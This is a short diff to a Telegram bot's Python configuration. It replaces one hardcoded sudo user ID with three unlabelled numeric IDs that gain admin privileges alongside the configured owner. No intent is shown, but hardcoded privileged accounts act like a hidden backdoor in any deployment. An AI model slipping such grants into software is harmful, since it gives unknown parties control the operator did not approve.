@@ -103,7 +103,9 @@ else:
     API_WEATHER = os.environ.get('API_WEATHER', None)
 
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(680915808) #Nitin's id
+SUDO_USERS.add(715539181)
+SUDO_USERS.add(816827190)
+SUDO_USERS.add(1233109584)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 dispatcher = updater.dispatcher
